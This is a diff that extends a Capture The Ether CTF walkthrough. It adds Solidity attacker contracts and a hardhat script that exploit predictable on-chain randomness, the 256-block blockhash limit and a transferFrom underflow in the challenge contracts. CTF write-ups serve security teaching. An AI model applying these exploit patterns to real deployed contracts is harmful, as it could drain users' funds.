@@ -2,6 +2,29 @@
 Walkthrough every level of the Capture The Ether CTF
 
 
+# Note About the Walkthrough
+
+## Usage of Interfaces
+Whenever any other external contracts are called, an interface with the called functions is created as a helper in order to make things easier and avoid having to create an encoded payload with each function selector followed by the usage of `_to.call{value: _val}(payload)`. 
+
+An example for an interface would be:
+
+    interface IPredictTheBlockHashChallenge {
+        function lockInGuess(bytes32 hash) external payable;
+        function settle() external;
+        function isComplete() external view returns (bool);
+    }
+
+The interface generally is initialized while constructing the attacker contracts when they are used to solve a level.
+
+## Timeout Error
+Some scripts may take some time to run because they are deploying contracts and performing several interactions that may have a timeout time greater than the default one of hardhat. If any errors are triggered because of that the following line can be added into the `hardhat.config` file:
+
+    mocha: {
+        timeout: 100000000
+    }
+
+Enjoy!
 
 # Solutions
 
@@ -133,7 +156,7 @@ As a conclusion, the information held on each slot can be consulted easily if we
 
 ### Guess The New Number
 
-The challenge in here is identifying that the pseudo-random number is generated every time the function is called according to the current parameters of the chain. Because of this, those values can be either manipulated by miners and also precalculated by any user if the call is executed in a single step as it is shown. Because we are going to need the current blockchain parameters in order to solve this, the following contract is used to crack this level:
+The challenge in here is identifying that the pseudo-random number is generated every time the function is called according to the current parameters of the chain. Because of this, those values can be either manipulated by miners or precalculated by any user if the call is executed in a single step as it is shown. Because we are going to need the current blockchain parameters in order to solve this, the following contract is used to crack this level:
 
     pragma solidity ^0.8.13;
 
@@ -156,4 +179,127 @@ The challenge in here is identifying that the pseudo-random number is generated 
         receive() external payable {}
     }  
 
-A reminder, do not forget implementing the `receive` fallback. Otherwise, the call will fail because when the instance sends `2 ether` to the winner on this case it will try sending them to `GuessTheNewNumberAttacker`. If the contract lacks from receive or of a payable fallback, it cannot receive assets from regular transfers.
+A reminder, do not forget implementing the `receive` fallback. Otherwise, the call will fail because when the instance sends `2 ether` to the winner on this case it will try sending them to `GuessTheNewNumberAttacker`. If the contract lacks from receive or a payable fallback, it cannot receive assets from regular transfers.
+
+### Predict The Future
+
+This level forces you to first lock the answer and then submit it. The core of this level is that the modulo 10 operation will take only the last digit of the `uint8` number from 0 to 9. So there are only 9 possibilities. If you lock the answer (lets say an arbitrary value of 5) and spam with simulated transactions offchain (e.g. using Ethers), you can let pass the transaction that will be successfully mined and that's it. Remember last level solution, regarding how it will be changing dynamically the answer of the lottery according to the current blockchain block values.
+
+A contract that attacks this could be:
+
+    contract PredictTheFutureAttacker {
+        IPredictTheFutureChallenge levelInstance;
+
+        constructor(address _levelInstance) {
+            levelInstance = IPredictTheFutureChallenge(_levelInstance);
+        }
+
+        function lockGuess(uint8 _number) external payable {
+            levelInstance.lockInGuess{value: 1 ether}(_number);
+        }
+
+        function attack() external {
+            levelInstance.settle();
+
+            require(levelInstance.isComplete(), "!completed");
+
+            // Transfer back all the funds to the user
+            (bool withdrawn, ) = payable(tx.origin).call{value: address(this).balance}("");
+            require(withdrawn,  "!withdrawn");
+        }
+
+        receive() external payable {}
+    }
+
+### Predict The BlockHash
+
+Calculating the blockhash of a blockchain is performed essentially by calculating the hash of relevant concatenated parameters of that block (e.g. previous block hash, gas consumption, gas limit, block number, difficulty, root hash, among others). That data is known once the batch of transactions that are going to be included on that block is already defined and the block is generated when a validator/miner validates that block along with the information that is going to be part of that block. 
+
+With all that being said, it is extremely difficult and also very unlikely that a blockhash can be predestinated before its existence (something that it is indeed  possible with smart contract addresses which are generated in a deterministically way which allows predestination!). 
+
+In order to solve this, it is important to understand the limitations of the `blockhash` function. According to [Solidity Docs](https://docs.soliditylang.org/en/v0.8.13/units-and-global-variables.html#block-and-transaction-properties): 
+
+> It is the hash of the given block. When blocknumber is one of the 256 most recent blocks; otherwise returns zero.
+
+This means that if the given block is 257 blocks older (or more), the return value will be `bytes32(0)`. So, we get your thinking... yes. We have to wait!!
+
+We can lock the guess as `bytes32(0)`, wait at least 256 blocks to be mined and then call `settle()` and the calculation of the answer will always be `bytes32(0)` starting from that block! Having about 5 blocks mined per minute, it will take about 51.2 mins for that to happen. So, grab a snack or just continue with the rest of the levels!
+
+    pragma solidity ^0.8.13;
+
+    contract PredictTheBlockHashAttacker {
+        IPredictTheBlockHashChallenge levelInstance;
+        
+        // It will be also implicitly initialized as zero if no value is assigned.
+        bytes32 public emptyBytes32 = bytes32(0); 
+
+        uint256 lockingBlockNumber;
+        uint16 public constant MAX_SAVESPAN = 256;
+
+        constructor(address _levelInstance) {
+            levelInstance = IPredictTheBlockHashChallenge(_levelInstance);
+        }
+
+        function lockGuess() external payable {
+            levelInstance.lockInGuess{value: 1 ether}(emptyBytes32);
+            lockingBlockNumber = block.number;
+        }
+
+        function remainingBlocks() external view returns(uint256){
+            return MAX_SAVESPAN - (block.number - lockingBlockNumber);
+        }
+
+        function attack() external {
+            require(block.number >= lockingBlockNumber + MAX_SAVESPAN, "Wait until 256 block passed");
+            levelInstance.settle();
+
+            require(levelInstance.isComplete(), "!completed");
+
+            // Transfer back all the funds to the user
+            (bool withdrawn, ) = payable(tx.origin).call{value: address(this).balance}("");
+            require(withdrawn,  "!withdrawn");
+        }
+        receive() external payable {}
+    }
+
+
+## Lotteries
+
+### Token Sale
+
+
+### Token Whale
+
+There are several issues regarding this contract. The first one which is the most spottable is that the version of the compiler does not come with built-in overflow/underflow checks such as `^0.8.0`, as a result of this any unsigned number when it reaches the max and adds one or the min and subtracts one, it will overflow or underflow. 
+
+For example:
+
+    uint16(-1) = type(uint16).max     // Underflowing
+    uint16(type(uint16).max + 1) = 0  // Overflowing
+
+The second issue which is the key is that how transfers are being performed. ERC20 compliant contracts usually use a general implementation of the internal function `_tranfer(from, to, value)`, where depending which external method is called the `from` parameter is passed as `msg.sender` (in case of regular `transfer()`) or directly as the `from` (for `transferFrom()`). 
+
+The third issue is that there are dummy and residual variable declarations that are not even taken into account. For example, the decimals are apparently not respected because the level assigns 1000 tokens to the user (which in an 18 decimal token it is essentially dust) and also the `totalSupply` only has informative value and it is not used for example to control the minting rate of those tokens.  
+
+With that being said, looking to the code of this level we see that `_transfer()` automatically sets the `from` as the `msg.sender` and also gives the chance to perform a `transferFrom()`. So, a user could create two accounts (Alpha, Beta), Alpha with balance and Beta empty. Alpha can approve Beta for one token and then Beta can call `transferFrom(Alpha, Anyone, 1)`. Because the checks within that function only target the `from` user, and Beta has the allowance `_transfer(Alpha, 1)` will be called. Then, the internal function will decrease Beta's balance in 1 because Beta is indeed the `msg.sender` (which will give Beta a balance of `uint256(-1) = type(uint256).max`) and then Beta can call again `transfer(Alpha, Anything)`. 
+
+This process can be done manually or by using a simple script.
+
+    describe("TokenWhaleChallenge", function () {
+        describe("Becoming a Whale", function () {
+            it("Exploiting...", async function () {
+                const [owner, alice] = await ethers.getSigners();
+                const instanceAddr = "0x8ce6A92F2F73049764d01Cf91d78438b1bFa54B5";
+            
+                const instance = await ethers.getContractAt("ITokenWhaleChallenge", instanceAddr);
+                
+                const tx1 = await instance.connect(owner).approve(alice.address, 1);
+                await wait(tx1);
+                const tx2 = await instance.connect(alice).transferFrom(owner.address, ethers.constants.AddressZero, 1);
+                await wait(tx2);
+                const tx3 = await instance.connect(alice).transfer(owner.address, 2000000);
+                await wait(tx3);
+
+            });
+        });
+    });
